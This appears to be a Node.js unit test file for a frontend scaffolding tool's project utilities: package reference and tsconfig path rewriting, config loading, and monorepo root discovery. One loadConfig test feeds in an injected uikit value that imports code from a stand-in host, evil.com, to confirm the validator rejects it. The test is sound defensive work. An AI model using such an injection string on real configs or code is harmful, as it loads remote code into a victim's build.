/**
 * Unit tests for project utilities
 *
 * Run with: node --import tsx --test src/utils/project.test.ts
 */

import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import path from 'path';
import fs from 'fs-extra';
import os from 'os';
import {
  loadConfig,
  findMonorepoRoot,
  getLocalPackageRef,
  rewriteTsconfigPackagePaths,
  CONFIG_FILE,
} from './project.js';

describe('getLocalPackageRef', () => {
  it('should convert @cyberfabric/react to a file: reference', () => {
    const result = getLocalPackageRef('@cyberfabric/react', '/repo', '/repo/app');
    assert.equal(result, 'file:../packages/react');
  });

  it('should convert @cyberfabric/framework to a file: reference', () => {
    const result = getLocalPackageRef('@cyberfabric/framework', '/repo', '/repo/app');
    assert.equal(result, 'file:../packages/framework');
  });

  it('should handle nested project paths', () => {
    const result = getLocalPackageRef('@cyberfabric/state', '/repo', '/repo/projects/my-app');
    assert.equal(result, 'file:../../packages/state');
  });

  it('should return non-@cyberfabric packages unchanged', () => {
    assert.equal(getLocalPackageRef('react', '/repo', '/repo/app'), 'react');
    assert.equal(getLocalPackageRef('lodash', '/repo', '/repo/app'), 'lodash');
    assert.equal(getLocalPackageRef('@types/node', '/repo', '/repo/app'), '@types/node');
  });
});

describe('rewriteTsconfigPackagePaths', () => {
  const tsconfigContent = JSON.stringify(
    {
      compilerOptions: {
        paths: {
          '@/*': ['./src/*'],
          '@cyberfabric/state': ['../../../state/src/index.ts'],
          '@cyberfabric/state/*': ['../../../state/src/*'],
          '@cyberfabric/react': ['../../../react/src/index.ts'],
          '@cyberfabric/react/*': ['../../../react/src/*'],
        },
      },
    },
    null,
    2
  );

  it('rewrites scaffold tsconfig aliases to installed package paths', () => {
    const rewritten = JSON.parse(
      rewriteTsconfigPackagePaths(tsconfigContent, {
        useLocalPackages: false,
      })
    ) as {
      compilerOptions: {
        paths: Record<string, string[]>;
      };
    };

    assert.deepEqual(rewritten.compilerOptions.paths, {
      '@/*': ['./src/*'],
      '@cyberfabric/state': ['./node_modules/@cyberfabric/state'],
      '@cyberfabric/state/*': ['./node_modules/@cyberfabric/state/*'],
      '@cyberfabric/react': ['./node_modules/@cyberfabric/react'],
      '@cyberfabric/react/*': ['./node_modules/@cyberfabric/react/*'],
    });
  });

  it('rewrites scaffold tsconfig aliases to local monorepo source paths', () => {
    const rewritten = JSON.parse(
      rewriteTsconfigPackagePaths(tsconfigContent, {
        useLocalPackages: true,
        monorepoRoot: '/repo',
        projectPath: '/repo/apps/demo',
      })
    ) as {
      compilerOptions: {
        paths: Record<string, string[]>;
      };
    };

    assert.deepEqual(rewritten.compilerOptions.paths, {
      '@/*': ['./src/*'],
      '@cyberfabric/state': ['../../packages/state/src/index.ts'],
      '@cyberfabric/state/*': ['../../packages/state/src/*'],
      '@cyberfabric/react': ['../../packages/react/src/index.ts'],
      '@cyberfabric/react/*': ['../../packages/react/src/*'],
    });
  });

  it('returns JSONC tsconfig unchanged when no @cyberfabric aliases exist', () => {
    const jsoncTsconfig = `{
  "compilerOptions": {
    "target": "ES2020",

    /* Bundler mode */
    "moduleResolution": "bundler",
    "paths": {
      "@/*": ["./src/*"]
    }
  }
}
`;

    assert.equal(
      rewriteTsconfigPackagePaths(jsoncTsconfig, {
        useLocalPackages: true,
        monorepoRoot: '/repo',
        projectPath: '/repo/apps/demo',
      }),
      jsoncTsconfig
    );
  });
});

describe('loadConfig', () => {
  let tmpDir: string;

  before(async () => {
    tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'frontx-test-loadconfig-'));
  });

  after(async () => {
    await fs.remove(tmpDir);
  });

  it('should return not_found when config file does not exist', async () => {
    const result = await loadConfig(tmpDir);
    assert.equal(result.ok, false);
    assert.equal((result as { error: string }).error, 'not_found');
    assert.match((result as { message: string }).message, /not found/);
  });

  it('should load a valid config', async () => {
    const configPath = path.join(tmpDir, CONFIG_FILE);
    await fs.writeFile(configPath, JSON.stringify({ frontx: true, uikit: 'shadcn' }));
    const result = await loadConfig(tmpDir);
    assert.equal(result.ok, true);
    assert.deepEqual((result as { config: unknown }).config, { frontx: true, uikit: 'shadcn' });
    await fs.remove(configPath);
  });

  it('should load config with uikit "none"', async () => {
    const configPath = path.join(tmpDir, CONFIG_FILE);
    await fs.writeFile(configPath, JSON.stringify({ frontx: true, uikit: 'none' }));
    const result = await loadConfig(tmpDir);
    assert.equal(result.ok, true);
    assert.deepEqual((result as { config: unknown }).config, { frontx: true, uikit: 'none' });
    await fs.remove(configPath);
  });

  it('should return invalid for empty string uikit', async () => {
    const configPath = path.join(tmpDir, CONFIG_FILE);
    await fs.writeFile(configPath, JSON.stringify({ frontx: true, uikit: '' }));
    const result = await loadConfig(tmpDir);
    assert.equal(result.ok, false);
    assert.equal((result as { error: string }).error, 'invalid');
    assert.match((result as { message: string }).message, /Invalid "uikit" value/);
    await fs.remove(configPath);
  });

  it('should return invalid for non-string uikit', async () => {
    const configPath = path.join(tmpDir, CONFIG_FILE);
    await fs.writeFile(configPath, JSON.stringify({ frontx: true, uikit: 123 }));
    const result = await loadConfig(tmpDir);
    assert.equal(result.ok, false);
    assert.equal((result as { error: string }).error, 'invalid');
    assert.match((result as { message: string }).message, /Invalid "uikit" value/);
    await fs.remove(configPath);
  });

  it('should return config when uikit is not present', async () => {
    const configPath = path.join(tmpDir, CONFIG_FILE);
    await fs.writeFile(configPath, JSON.stringify({ frontx: true }));
    const result = await loadConfig(tmpDir);
    assert.equal(result.ok, true);
    assert.deepEqual((result as { config: unknown }).config, { frontx: true });
    await fs.remove(configPath);
  });

  it('should load config with a custom uikit package', async () => {
    const configPath = path.join(tmpDir, CONFIG_FILE);
    await fs.writeFile(configPath, JSON.stringify({ frontx: true, uikit: '@acronis-platform/shadcn-uikit' }));
    const result = await loadConfig(tmpDir);
    assert.equal(result.ok, true);
    assert.deepEqual((result as { config: unknown }).config, { frontx: true, uikit: '@acronis-platform/shadcn-uikit' });
    await fs.remove(configPath);
  });

  it('should return invalid for uikit with invalid npm package-name syntax', async () => {
    const configPath = path.join(tmpDir, CONFIG_FILE);
    await fs.writeFile(configPath, JSON.stringify({ frontx: true, uikit: "'; import('http://evil.com/x');" }));
    const result = await loadConfig(tmpDir);
    assert.equal(result.ok, false);
    assert.equal((result as { error: string }).error, 'invalid');
    assert.match((result as { message: string }).message, /not a valid npm package name/);
    await fs.remove(configPath);
  });

  it('should return invalid for uikit with spaces', async () => {
    const configPath = path.join(tmpDir, CONFIG_FILE);
    await fs.writeFile(configPath, JSON.stringify({ frontx: true, uikit: 'bad package name' }));
    const result = await loadConfig(tmpDir);
    assert.equal(result.ok, false);
    assert.equal((result as { error: string }).error, 'invalid');
    assert.match((result as { message: string }).message, /not a valid npm package name/);
    await fs.remove(configPath);
  });
});

describe('findMonorepoRoot', () => {
  let tmpDir: string;

  before(async () => {
    tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'frontx-test-monorepo-'));
  });

  after(async () => {
    delete process.env.FRONTX_MONOREPO_ROOT;
    await fs.remove(tmpDir);
  });

  it('should return null when no monorepo structure is found', async () => {
    delete process.env.FRONTX_MONOREPO_ROOT;
    const leaf = path.join(tmpDir, 'some', 'deep', 'path');
    await fs.ensureDir(leaf);
    const result = await findMonorepoRoot(leaf);
    assert.equal(result, null);
  });

  it('should find monorepo root with packages/react and workspaces', async () => {
    delete process.env.FRONTX_MONOREPO_ROOT;
    const monoRoot = path.join(tmpDir, 'mono');
    await fs.ensureDir(path.join(monoRoot, 'packages', 'react'));
    await fs.writeJson(path.join(monoRoot, 'packages', 'react', 'package.json'), { name: '@cyberfabric/react' });
    await fs.writeJson(path.join(monoRoot, 'package.json'), {
      name: 'frontx-monorepo',
      workspaces: ['packages/*'],
    });

    const childDir = path.join(monoRoot, 'apps', 'my-app');
    await fs.ensureDir(childDir);

    const result = await findMonorepoRoot(childDir);
    assert.equal(result, monoRoot);
  });

  it('should respect FRONTX_MONOREPO_ROOT env variable', async () => {
    const monoRoot = path.join(tmpDir, 'env-mono');
    await fs.ensureDir(path.join(monoRoot, 'packages', 'react'));
    await fs.writeJson(path.join(monoRoot, 'packages', 'react', 'package.json'), { name: '@cyberfabric/react' });

    process.env.FRONTX_MONOREPO_ROOT = monoRoot;

    const result = await findMonorepoRoot('/some/random/path');
    assert.equal(result, path.resolve(monoRoot));

    delete process.env.FRONTX_MONOREPO_ROOT;
  });

  it('should skip directories without workspaces containing packages/', async () => {
    delete process.env.FRONTX_MONOREPO_ROOT;
    const fakeRoot = path.join(tmpDir, 'fake-mono');
    await fs.ensureDir(path.join(fakeRoot, 'packages', 'react'));
    await fs.writeJson(path.join(fakeRoot, 'packages', 'react', 'package.json'), { name: '@cyberfabric/react' });
    await fs.writeJson(path.join(fakeRoot, 'package.json'), {
      name: 'not-a-monorepo',
      workspaces: ['apps/*'],
    });

    const child = path.join(fakeRoot, 'apps', 'test');
    await fs.ensureDir(child);

    const result = await findMonorepoRoot(child);
    assert.equal(result, null);
  });
});
